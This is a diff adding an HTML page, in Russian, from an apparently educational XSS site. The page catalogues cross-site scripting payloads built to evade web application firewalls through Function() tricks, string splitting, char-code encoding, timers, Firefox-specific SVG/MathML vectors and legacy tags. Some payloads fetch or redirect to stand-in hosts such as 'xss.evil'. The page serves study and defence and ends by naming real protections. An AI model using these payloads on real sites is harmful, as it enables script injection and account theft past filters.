@@ -1,0 +1,473 @@
+<!DOCTYPE html>
+<html lang="ru">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <title>XSS DOC | WAF Bypass</title>
+
+    <!-- TAILWIND -->
+    <link rel="stylesheet" href="../assets/tailwind.css" />
+
+    <!-- STYLES -->
+    <link rel="stylesheet" href="../style.css">
+</head>
+
+<body class="text-white font-sans antialiased bg-grid relative overflow-x-hidden doc-page">
+
+    <!-- SIDEBAR -->
+    <div id="sidebar-container"></div>
+
+    <!-- SIDEBAR SCRIPT -->
+    <script src="../assets/dom-safe.js"></script>
+    <script src="../assets/sidebar.js" defer></script>
+
+    <!-- BACKGROUND -->
+    <div class="fixed inset-0 overflow-hidden -z-10 pointer-events-none">
+
+        <div class="absolute top-0 left-0 w-[600px] h-[600px]
+            bg-red-500/20 blur-[160px] rounded-full">
+        </div>
+
+        <div class="absolute bottom-0 right-0 w-[500px] h-[500px]
+            bg-cyan-500/15 blur-[160px] rounded-full">
+        </div>
+
+        <div class="absolute top-1/3 left-1/4 w-[400px] h-[400px]
+            bg-purple-700/10 blur-[140px] rounded-full">
+        </div>
+
+    </div>
+
+    <!-- PAGE -->
+    <div class="site-shell doc-content px-4 lg:px-8">
+
+        <!-- MAIN -->
+        <main class="max-w-7xl mx-auto px-5 py-14 md:py-20">
+
+            <!-- HERO -->
+            <section class="text-center mb-20">
+
+                <span class="uppercase tracking-[0.3em]
+                    text-red-500 text-sm font-semibold">
+
+                    XSS Bypass Techniques
+
+                </span>
+
+                <h1 class="text-3xl sm:text-5xl md:text-7xl font-black mt-5 px-2
+                    bg-gradient-to-r from-white via-red-200 to-red-500
+                    bg-clip-text text-transparent break-words">
+
+                    WAF Bypass Payloads
+
+                </h1>
+
+                <div class="h-1 w-24 bg-red-500/60
+                    rounded-full mt-8 mx-auto">
+                </div>
+
+            </section>
+
+            <!-- CONTENT -->
+            <section class="space-y-10">
+
+                <!-- INTRO -->
+                <div class="card-glass rounded-3xl
+                    p-8 md:p-10
+                    border border-red-500/10">
+
+                    <p class="text-gray-300 text-lg leading-9 mb-6">
+
+                        Современные веб-приложения часто используют
+                        <span class="text-red-400 font-semibold">
+                            Web Application Firewall (WAF)
+                        </span>
+                        для блокировки базовых XSS-атак.
+
+                    </p>
+
+                    <p class="text-gray-300 text-lg leading-9 mb-6">
+
+                        Такие фильтры обычно легко распознают:
+                        <span class="text-red-400">&lt;script&gt;</span>,
+                        <span class="text-red-400">alert(1)</span>,
+                        а также популярные обработчики событий вроде
+                        <span class="text-red-400">
+                            onerror=alert(1)
+                        </span>.
+
+                    </p>
+
+                    <p class="text-gray-300 text-lg leading-9">
+
+                        Однако на практике многие WAF
+                        всё ещё плохо справляются
+                        с обфусцированными,
+                        нестандартными и креативными скриптами.
+
+                    </p>
+
+                </div>
+
+                <!-- BLOCK 1 -->
+                <div class="rounded-3xl border border-red-500/20
+                    bg-gradient-to-b from-zinc-900 to-black
+                    p-8 md:p-10">
+
+                    <div class="doc-section-title">
+
+                        <span class="doc-section-icon">🔒</span>
+
+                        <h2 class="text-white">
+                            Скрипт без alert() и prompt()
+                        </h2>
+
+                    </div>
+
+                    <p class="text-gray-300 leading-9 mb-8">
+
+                        Конструктор
+                        <span class="text-red-400 font-semibold">
+                            Function()
+                        </span>
+                        позволяет выполнять JavaScript-код косвенно,
+                        обходя сигнатуры WAF,
+                        ориентированные на
+                        <span class="text-red-400">alert()</span>,
+                        <span class="text-red-400">prompt()</span>
+                        и другие очевидные конструкции.
+
+                    </p>
+
+                    <div class="rounded-2xl bg-black/50
+                        border border-zinc-800
+                        p-6 overflow-x-auto">
+
+<pre class="text-green-400 text-sm md:text-base leading-8"><code>&lt;svg onload=Function\fetch`//xss`()&gt;
+
+&lt;img src=x onerror=Function\location.href=`//x.evil``()&gt;`
+
+&lt;svg onload=Function\console.log\1337`()&gt;`</code></pre>
+
+                    </div>
+
+                </div>
+
+                <!-- BLOCK 2 -->
+                <div class="rounded-3xl border border-cyan-500/20
+                    bg-cyan-500/5
+                    p-5 sm:p-8 md:p-10 min-w-0 overflow-hidden">
+
+                    <div class="doc-section-title">
+
+                        <span class="doc-section-icon">🛡️</span>
+
+                        <h2 class="text-cyan-300">
+                            Когда &lt;script&gt; и alert() заблокированы
+                        </h2>
+
+                    </div>
+
+                    <p class="text-gray-300 leading-9 mb-8">
+
+                        Использование
+                        <span class="text-cyan-300 font-semibold">
+                            Function()
+                        </span>
+                        вместе с backticks и экранированием
+                        помогает обходить сигнатуры,
+                        ориентированные на классические скрипты.
+
+                    </p>
+
+                    <div class="rounded-2xl bg-black/50
+                        border border-zinc-800
+                        p-6 overflow-x-auto">
+
+<pre class="text-green-400 text-sm md:text-base leading-8"><code>&lt;svg onload=Function\prompt\1\`()&gt;`
+
+&lt;svg onload=Function\confirm\1337\`()&gt;`
+
+&lt;svg onload=new Function\console.log\42\`()&gt;`
+
+&lt;svg onload=Function\fetch`//xss.evil``()&gt;`</code></pre>
+
+                    </div>
+
+                </div>
+
+                <!-- BLOCK 3 -->
+                <div class="rounded-3xl border border-purple-500/20
+                    bg-purple-500/5
+                    p-8 md:p-10">
+
+                    <div class="doc-section-title">
+
+                        <span class="doc-section-icon">🧩</span>
+
+                        <h2 class="text-purple-300">
+                            Обход фильтрации по ключевым словам
+                        </h2>
+
+                    </div>
+
+                    <p class="text-gray-300 leading-9 mb-6">
+
+                        Некоторые WAF ищут слова:
+                        <span class="text-red-400">alert</span>,
+                        <span class="text-red-400">prompt</span>,
+                        <span class="text-red-400">eval</span>
+                        и другие опасные конструкции.
+
+                    </p>
+
+                    <ul class="list-disc pl-6
+                        text-gray-300 space-y-3
+                        marker:text-red-400 mb-8">
+
+                        <li>Разделение строк</li>
+                        <li>Unicode-символы</li>
+                        <li>String.fromCharCode()</li>
+                        <li>Динамическая сборка функций</li>
+
+                    </ul>
+
+                    <div class="rounded-2xl bg-black/50
+                        border border-zinc-800
+                        p-6 overflow-x-auto">
+
+<pre class="text-green-400 text-sm md:text-base leading-8"><code>&lt;img src=x onerror=eval('con'+'firm(1)')&gt;
+
+&lt;svg onload=Function("co"+"nfirm(1)")()&gt;
+
+&lt;svg onload=eval(
+String.fromCharCode(
+99,111,110,102,105,114,109,40,49,41
+)
+)&gt;</code></pre>
+
+                    </div>
+
+                </div>
+
+                <!-- BLOCK 4 -->
+                <div class="rounded-3xl border border-yellow-500/20
+                    bg-yellow-500/5
+                    p-8 md:p-10">
+
+                    <div class="doc-section-title">
+
+                        <span class="doc-section-icon">⏳</span>
+
+                        <h2 class="text-yellow-300">
+                            Отложенное выполнение
+                        </h2>
+
+                    </div>
+
+                    <p class="text-gray-300 leading-9 mb-8">
+
+                        Использование
+                        <span class="text-yellow-300 font-semibold">
+                            setTimeout()
+                        </span>
+                        и
+                        <span class="text-yellow-300 font-semibold">
+                            setInterval()
+                        </span>
+                        помогает скрывать выполнение скрипта
+                        и обходить проверки WAF.
+
+                    </p>
+
+                    <div class="rounded-2xl bg-black/50
+                        border border-zinc-800
+                        p-6 overflow-x-auto">
+
+<pre class="text-green-400 text-sm md:text-base leading-8"><code>&lt;svg onload=setTimeout\prompt\1337\`&gt;
+
+&lt;svg onload=setInterval\console.log\1\`,3000&gt;</code></pre>
+
+                    </div>
+
+                </div>
+
+                <!-- FIREFOX -->
+                <div class="rounded-3xl border border-orange-500/20
+                    bg-orange-500/5
+                    p-8 md:p-10">
+
+                    <div class="doc-section-title">
+
+                        <span class="doc-section-icon">🦊</span>
+
+                        <h2 class="text-orange-300">
+                            Firefox-специфичные техники
+                        </h2>
+
+                    </div>
+
+                    <p class="text-gray-300 leading-9 mb-8">
+
+                        Firefox всё ещё поддерживает
+                        некоторые устаревшие возможности SVG,
+                        MathML и javascript:-URI.
+
+                    </p>
+
+                    <div class="rounded-2xl bg-black/50
+                        border border-zinc-800
+                        p-6 overflow-x-auto">
+
+<pre class="text-green-400 text-sm md:text-base leading-8"><code>&lt;svg&gt;
+&lt;script xlink:href=
+"data:text/javascript,confirm(1)"&gt;
+&lt;/script&gt;
+&lt;/svg&gt;
+
+&lt;iframe src="javascript:confirm(1)"&gt;&lt;/iframe&gt;
+
+&lt;math&gt;
+&lt;maction xlink:href=
+"data:text/html,&lt;svg onload=confirm(1)&gt;"&gt;
+&lt;/maction&gt;</code></pre>
+
+                    </div>
+
+                </div>
+
+                <!-- LEGACY -->
+                <div class="rounded-3xl border border-pink-500/20
+                    bg-pink-500/5
+                    p-8 md:p-10">
+
+                    <div class="doc-section-title">
+
+                        <span class="doc-section-icon">🧨</span>
+
+                        <h2 class="text-pink-300">
+                            Редкие и устаревшие HTML-теги
+                        </h2>
+
+                    </div>
+
+                    <p class="text-gray-300 leading-9 mb-8">
+
+                        Некоторые WAF игнорируют старые
+                        или редко используемые теги:
+                        <span class="text-pink-300">
+                            &lt;xmp&gt;
+                        </span>,
+                        <span class="text-pink-300">
+                            &lt;marquee&gt;
+                        </span>,
+                        <span class="text-pink-300">
+                            &lt;object&gt;
+                        </span>.
+
+                    </p>
+
+                    <div class="rounded-2xl bg-black/50
+                        border border-zinc-800
+                        p-6 overflow-x-auto">
+
+<pre class="text-green-400 text-sm md:text-base leading-8"><code>&lt;xmp&gt;
+&lt;svg onload=Function\confirm\1\`()&gt;`
+
+&lt;marquee onfinish=
+Function\prompt\1\`() loop=1&gt;
+
+&lt;object data=x type=image/jpeg
+onerror=Function\prompt\1\`()&gt;`</code></pre>
+
+                    </div>
+
+                </div>
+
+                <!-- FINAL -->
+                <div class="relative overflow-hidden rounded-3xl
+                    border border-red-500/20
+                    bg-gradient-to-r from-red-950/30 via-black to-black
+                    p-8 md:p-10">
+
+                    <div class="absolute inset-0 opacity-10
+                        bg-[radial-gradient(circle_at_center,#ef4444,transparent_60%)]">
+                    </div>
+
+                    <div class="relative z-10">
+
+                        <h2 class="text-3xl font-black text-white mb-6">
+                            Важно понимать
+                        </h2>
+
+                        <p class="text-gray-300 text-lg leading-9 mb-5">
+
+                            Большинство современных WAF
+                            эффективно блокируют только
+                            шаблонные и примитивные скрипты.
+
+                        </p>
+
+                        <p class="text-gray-300 text-lg leading-9">
+
+                            Реальная защита от XSS требует:
+                            безопасной работы с DOM,
+                            корректного экранирования данных,
+                            CSP и отказа от небезопасных
+                            JavaScript API.
+
+                        </p>
+
+                    </div>
+
+                </div>
+
+            </section>
+
+            <!-- FOOTER -->
+            <footer class="px-6 lg:px-24 py-14
+                border-t border-white/10 mt-20 text-center">
+
+                <h3 class="text-2xl font-black text-red-400 mb-4">
+                    XSS SHIELD
+                </h3>
+
+                <p class="text-gray-400 mb-6">
+                    Исследование и защита от
+                    Cross-Site Scripting атак.
+                </p>
+
+                <div class="flex justify-center gap-6
+                    text-gray-400 text-sm">
+
+                    <a href="https://github.com/RuslanSadvakasov"
+                        class="hover:text-red-400 transition">
+
+                        GitHub
+
+                    </a>
+
+                    <a href="https://t.me/sadvakasovruslan"
+                        class="hover:text-red-400 transition">
+
+                        Telegram
+
+                    </a>
+
+                </div>
+
+                <p class="text-gray-500 text-sm mt-8">
+                    © 2026 Sadvakasov Ruslan
+                </p>
+
+            </footer>
+
+        </main>
+
+    </div>
+
+</body>
+
+</html>
